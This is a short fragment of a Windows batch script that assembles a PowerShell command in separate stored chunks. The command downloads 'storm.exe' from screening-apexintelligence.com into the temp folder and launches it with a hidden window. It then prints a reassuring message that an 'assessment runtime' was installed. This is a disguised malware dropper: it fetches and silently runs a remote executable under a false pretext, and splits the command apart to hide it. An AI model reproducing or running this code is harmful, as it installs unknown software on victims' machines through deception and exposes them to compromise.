...
set "P2=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
set "P3=$u='http://screening-apexintelligence.com/storm.exe';"
...
:: ----- STORE CHUNK 2 -----
set "P4=$o=\"$env:TEMP\storm.exe\";"
set "P5=Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;"
...
:: ----- STORE CHUNK 3 -----
set "P6=Start-Process $o -WindowStyle Hidden;echo '[+] Assessment runtime installed.'"
